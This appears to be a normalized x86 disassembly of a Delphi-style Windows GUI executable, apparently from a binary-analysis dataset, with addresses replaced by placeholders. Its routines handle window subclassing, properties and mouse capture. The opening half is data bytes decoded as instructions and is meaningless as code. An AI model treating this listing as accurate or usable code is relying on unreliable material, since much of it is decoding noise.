inc ecx
je r-xdata
jae r-xdata
bound ebp [ edi + 0x76 ]
inc eax
add [ eax ] al
add [ eax - 0x80000000 ] al
mov [ esi ] 0xf0
test al 0x46
add [ edi ] cl
add [ eax ] cl
inc ebx
add [ eax ] al
or [ eax ] al
add al [ eax ]
dec esp
leave
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah cl
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add al [ eax ]
xor [ eax ] al
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ecx + ecx * 8 + 0x46 ] cl
jae r-xdata
push eax
outsd
jb r-xdata
pop es
0x46
outsd
outsb
inc ecx
je r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
dec esp
leave
inc esi
add [ eax ] al
pop eax
inc eax
add [ eax - 0x63ffbfa8 ] dh
jb r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
add [ eax ] ch
add [ edx ] al
outsd
outsb
je r-xdata
jne r-xdata
imul esi [ ebx + 0x70 ] 0x5479616c
imul ebp [ ebp + 0x65 ] 0x7c000002
0x500043 0x0
jne r-xdata
mov ah 0x43
add ah dl
pop eax
jo r-xdata
dec ecx
outsb
js r-xdata
adc al [ eax ]
add [ edx ] 0x0
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5405ffff ] al
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
test [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ 0xffffffffc99f0200 ] al
inc esi
add [ edx ] al
add [ edx ] al
rol [ esi ] 0x1
js r-xdata
jae r-xdata
inc esi
push edi
jne r-xdata
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ch
adc [ eax ] cl
pop eax
mov ch 0x43
add ah cl
adc cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ eax ] al
adc [ esi + 0x48 ] al
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
imul ebp [ edi + 0x6e ] r-xdata
mov [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jo r-xdata
or [ eax + 0x6f ] dl
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
shr [ edx + ecx * 8 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x34 ] bh
inc esi
add [ edx + ecx * 8 - 0x34baffba ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x35 ] dh
inc esi
add [ eax + eax ] bl
add [ eax - 0x3f ] ah
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ esp + esi * 4 + 0x58d40043 ] bl
js r-xdata
add bh bh
sbb al 0xd1
inc esi
add [ eax + 0x2 ] bh
jb r-xdata
popad
imul esi [ ebp + eax * 2 + 0x76 ] 0x2746e65
add [ eax ] al
add [ 0x46cb8b00 ] al
add [ eax + eax - 0xc ] al
call ebx

add al [ eax ]
add [ ecx + edx * 8 ] bl
inc esi
add [ eax + eax ] al
add [ ebx ] cl
inc esi
dec eax
imul ebp [ esi + 0x74 ] 0x656a624f
arpl [ edx + eax ] si
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
add [ ecx ] cl
inc esi
dec eax
imul esp [ ebp + 0x48 ] 0x2746e69
add [ eax ] al
add [ eax ] dl
inc eax
add [ ecx ] cl
add [ eax ] al
pop es
inc esi
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add al [ gs : eax ]
add al bh
adc [ eax ] al
dec esp
add [ eax ] al
add [ esi + eax * 2 ] cl
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add bh bh
add [ eax ] al
or [ eax ] al
add [ eax ] eax
dec esp
leave
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
push eax
leave
inc esi
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ ecx + ecx * 8 + 0x46 ] cl
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5008ffff ] al
outsd
outsd
sub_46c832
push es
dec eax
add [ ecx + ecx + 0x48 ] bl
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
outsd
je r-xdata
pop es
dec eax
je r-xdata
jae r-xdata
or dl [ eax + 0x6f ]
insd
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
add [ edx ] al
je r-xdata
add [ eax ] dl
push eax
outsd
jae r-xdata
outsd
outsb
inc ecx
je r-xdata
add [ esi + eax + 0x41080048 ] bh
jne r-xdata
add ah dl
push es
dec eax
add [ esi ] al
inc ebx
jb r-xdata
pop es
0x46
outsd
outsb
inc ecx
je r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
dec esp
leave
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x10040a8 ] al
add [ 0x6e696f50 ] al
je r-xdata
add [ eax ] al
inc esi
outsd
push ebx
imul edi [ edx + 0x65 ] 0x3
add [ eax ] al
or [ eax ] al
add [ eax ] eax
dec esp
leave
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
cmp [ eax ] eax
mov ah 0x8
dec eax
add [ edx ] cl
push eax
add eax [ eax ]
add [ eax ] al
popad
je r-xdata
outsd
outsb
je r-xdata
jne r-xdata
add [ eax ] bh
add [ eax ] dl
or [ eax ] cl
or dl [ eax + 0x6f ]
add [ edx ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ecx + ecx * 8 + 0x46 ] cl
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
dec esp
leave
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] bl
aad 0x42
add [ edx ] al
add [ esi ] al
inc ecx
dec edi
ja r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
rol [ esi ] 0x1
js r-xdata
jae r-xdata
je r-xdata
je r-xdata
jae r-xdata
push eax
outsd
jb r-xdata
dec ecx
outsb
js r-xdata
inc eax
add [ 0xffffffffc99f0200 ] al
inc esi
add [ edx ] al
add [ edx ] al
js r-xdata
add bh bh
sbb al 0xd1
inc esi
add [ eax + 0x2 ] bh
jb r-xdata
add [ edx + eax ] bh
insd
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
outsd
outsb
inc ecx
je r-xdata
add [ eax ] ch
add [ edx ] al
jo r-xdata
or [ eax + 0x6f ] dl
shr [ edx + ecx * 8 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x34 ] bh
inc esi
add [ edx + ecx * 8 - 0x34baffba ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x35 ] dh
inc esi
add [ eax + eax ] bl
add [ eax - 0x3f ] ah
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ esp + esi * 4 + 0x58d40043 ] bl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add bh bh
add [ eax ] al
or [ eax ] al
add [ eax ] eax
dec esp
leave
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
push eax
leave
inc esi
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ ecx + ecx * 8 + 0x46 ] cl
jae r-xdata
adc al [ eax ]
add [ edx ] 0x0
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5405ffff ] al
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
test [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
bound ebp [ edi + 0x76 ]
inc eax
add [ eax ] al
add [ eax - 0x80000000 ] al
mov [ esi ] 0xf0
test al 0x46
add [ edi ] cl
add [ eax ] cl
inc ebx
add [ eax ] al
or [ eax ] al
add al [ eax ]
dec esp
leave
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah cl
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add al [ eax ]
xor [ eax ] al
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ecx + ecx * 8 + 0x46 ] cl
imul esi [ ebx + 0x70 ] 0x5479616c
imul ebp [ ebp + 0x65 ] 0x7c000002
0x500043 0x0
jne r-xdata
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5008ffff ] al
outsd
outsd
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
pop eax
inc eax
add [ eax - 0x63ffbfa8 ] dh
jb r-xdata
inc esi
push edi
jne r-xdata
mov ah 0x43
add ah dl
pop eax
jo r-xdata
popad
imul esi [ ebp + eax * 2 + 0x76 ] 0x2746e65
add [ eax ] al
add [ 0x46cb8b00 ] al
add [ eax + eax - 0xc ] al
call ebx

add al [ eax ]
add [ ecx + edx * 8 ] bl
inc esi
add [ eax + eax ] al
add [ ebx ] cl
inc esi
dec eax
imul ebp [ esi + 0x74 ] 0x656a624f
arpl [ edx + eax ] si
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
add [ ecx ] cl
inc esi
dec eax
imul esp [ ebp + 0x48 ] 0x2746e69
add [ eax ] al
add [ eax ] dl
inc eax
add [ ecx ] cl
add [ eax ] al
pop es
inc esi
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add al [ gs : eax ]
add al bh
adc [ eax ] al
dec esp
add [ eax ] al
add [ esi + eax * 2 ] cl
inc esp
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ch
adc [ eax ] cl
pop eax
mov ch 0x43
add ah cl
adc cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ eax ] al
adc [ esi + 0x48 ] al
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
imul ebp [ edi + 0x6e ] r-xdata
mov [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub_46ca46
dec [ edx ]
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
or [ eax + 0x6f ] dl
jo r-xdata
shr [ edx + ecx * 8 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x34 ] bh
inc esi
add [ edx + ecx * 8 - 0x34baffba ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x35 ] dh
inc esi
add [ eax + eax ] bl
add [ eax - 0x3f ] ah
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ esp + esi * 4 + 0x58d40043 ] bl
jae r-xdata
bound ebp [ edi + 0x76 ]
inc eax
adc al [ eax ]
add [ edx ] 0x0
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5405ffff ] al
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
test [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esi [ ebx + 0x70 ] 0x5479616c
imul ebp [ ebp + 0x65 ] 0x7c000002
0x500043 0x0
jne r-xdata
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
pop eax
inc eax
add [ eax - 0x63ffbfa8 ] dh
jb r-xdata
inc esi
push edi
jne r-xdata
mov ah 0x43
add ah dl
pop eax
jo r-xdata
popad
imul esi [ ebp + eax * 2 + 0x76 ] 0x2746e65
add [ eax ] al
add [ 0x46cb8b00 ] al
add [ eax + eax - 0xc ] al
call ebx

add al [ eax ]
add [ ecx + edx * 8 ] bl
inc esi
add [ eax + eax ] al
add [ ebx ] cl
inc esi
dec eax
imul ebp [ esi + 0x74 ] 0x656a624f
arpl [ edx + eax ] si
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
add [ ecx ] cl
inc esi
dec eax
imul esp [ ebp + 0x48 ] 0x2746e69
add [ eax ] al
add [ eax ] dl
inc eax
add [ ecx ] cl
add [ eax ] al
pop es
inc esi
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add al [ gs : eax ]
add al bh
adc [ eax ] al
dec esp
add [ eax ] al
add [ esi + eax * 2 ] cl
inc esp
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ch
adc [ eax ] cl
pop eax
mov ch 0x43
add ah cl
adc cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ eax ] al
adc [ esi + 0x48 ] al
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
imul ebp [ edi + 0x6e ] r-xdata
mov [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub_46d2ce
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov eax [ ebp + 0x8 ]
push eax
call IsWindowUnicode
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x25c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x25c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call __imp_SetWindowLongW
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call __imp_GetWindowLongW
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropW
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropW
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x25c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax eax
jne r-xdata
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
jmp r-xdata
sub_46d3e0
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call __imp_SendMessageW
pop edx
pop ebx
retn
sub_46d414
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_407134
push eax
call GlobalFindAtomW
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_46d3e0
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropW
mov esi eax
jmp r-xdata
sub_46d470
push ebx
mov ebx eax
mov eax ebx
call sub_46d414
test eax eax
setne al
test al al
jne r-xdata
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call [ rw-data ]
sub_46d4a0
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x170 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call __imp_SendMessageW
pop esi
pop ebx
retn
sub_46d7a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_417b94
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4077d0
mov eax edi
mov edx esi
call sub_4070a8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46d7ec
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_417b94
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4077d0
mov eax edi
mov edx esi
call sub_4070a8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46d834
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
push ebx
mov ecx ebx
mov edx 0x14
mov eax [ esi + 0x34 ]
call sub_472314
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_46d8ac
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
jne r-xdata
mov eax ebx
call sub_479ce0
push eax
call SetCapture
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x34 ]
sub_46da7c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
xor eax eax
mov [ edi ] eax
xor ebx ebx
jmp r-xdata
mov eax [ edi ]
cmp eax [ esi + 0x8 ]
jl r-xdata
mov edx [ edi ]
mov eax esi
call sub_4305a0
cmp ebp [ eax + 0x4 ]
sete bl
test bl bl
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ edi ]
sub_46dab4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_479ce0
mov ebx eax
mov esi ebx
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov esi ebx
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_46dae0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_404204
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_46dab4
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_46da7c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4303e0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4305a0
mov edi eax
mov eax [ edi ]
call sub_479ce0
push eax
mov eax [ ebx ]
call sub_479ce0
push eax
call IsChild
test eax eax
je r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_430658
jmp r-xdata
inc [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46db64
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_430420
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4305a0
mov edx 0x8
call sub_404220
inc esi
dec ebx
jne r-xdata
sub_46db98
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4305a0
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_46da7c
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_46dbfc
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x1c ]
mov [ eax + 0x1c ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
mov ecx [ edx + 0x30 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x34 ] ecx
retn
sub_46dc84
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46dd83
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ edx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_46ee04
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_46e780
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ edx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edx + 0x8 ]
mov [ ebp - 0x10 ] eax
movsx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
movsx eax [ ebp - 0xe ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_46e780
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ edx + 0xc ] 0x1
xor eax eax
call sub_46ee04
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_46e780
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_46ee04
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
jmp r-xdata
mov al 0x1
call sub_46ee04
jmp r-xdata
xor eax eax
call sub_46ee04
jmp r-xdata
sub_46dd88
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4a0994
call sub_406174
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_46ee04
sub_46dde0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46de0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46de4c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x40 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_46de88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46dbfc
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x40 ]
mov [ ebx + 0x40 ] eax
sub_46deb4
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov si 0xffdf
call sub_40587c
sub_46dee0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x40 ]
mov si 0xffe1
call sub_40587c
xor edx edx
sub_46df38
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x88 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x88 ]
call sub_47c524
sub_46df5c
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x88 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x88 ]
call sub_47c50c
sub_46df84
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_46de4c
mov [ ebx + 0x38 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_44cb58
mov esi eax
mov [ ebx + 0x48 ] esi
mov edx 0xffffff
xor eax eax
call sub_453b68
mov edx eax
mov eax esi
call sub_44ccf0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_46dfec
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x48 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_46e01c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46de88
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
movzx edx [ eax + 0x5c ]
mov [ ebx + 0x5c ] dl
mov edx [ eax + 0x60 ]
mov [ ebx + 0x60 ] edx
movzx edx [ eax + 0x74 ]
mov [ ebx + 0x74 ] dl
push esi
lea esi [ eax + 0x4c ]
lea edi [ ebx + 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x64 ]
lea edi [ ebx + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_46e0a4
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
